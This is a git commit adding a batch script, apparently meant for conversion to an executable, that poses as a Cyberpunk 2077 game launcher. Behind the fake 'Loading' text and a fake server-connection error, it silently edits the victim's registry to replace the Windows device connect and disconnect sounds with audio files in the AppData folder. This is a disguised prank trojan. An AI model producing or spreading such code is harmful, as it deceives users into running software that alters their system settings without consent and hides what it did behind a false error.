278b869c3668ad4c6bde0d2664edbef3204515be
rumbamalajla <70714391+rumbamalajla@users.noreply.github.com>
2020-09-03 18:45:39 +0200

    Add files via upload

---
+++ Cyberpunk_2077.bat
@@ -0,0 +1,47 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWHPeyGw/PwIUSguOOG6oRv1OuqHH5++Pp3EcXOpxb47Nug==
+::fBE1pAF6MU+EWHPeyGw/PwIUSguOOG6oRv1OuqHH5++Pp3EWTeM+NpjazNQ=
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFAlBQQaDMWq2B78Q6dTf6vmMtkINaO4wf4CV07eBQA==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF25
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF25
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpSI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlXMbyXtZg==
+::ZQ05rAF9IAHYFVzEqQITMRlRXhSXMmCFVOVLv4g=
+::eg0/rx1wNQPfEVWB+kM9LVsJDCebPm6oFqAS49epv73Qwg==
+::fBEirQZwNQPfEVWB+kM9LVsJDCebPm6oFqAS49epv73Qwg==
+::cRolqwZ3JBvQF1fEqQITMRlRXhSXMmCFVOVLv4g=
+::dhA7uBVwLU+EWHqgxHBQ
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCWDJHeL41twLhRYSAGQfCPoVPwg4O3z6taku08YRvIqdoTkiOTZd64W8kCE
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+reg add HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current /ve /t REG_SZ /d %appdata%\ahh.wav /f > nul
+reg add HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current /ve /t REG_SZ /d %appdata%\kyaa.wav /f > nul
+title Cyberpunk_2077
+color 02
+echo Loading...
+echo Starting...
+pause
+color 04
+echo Error connecting to server!
+echo Try again later.
+pause
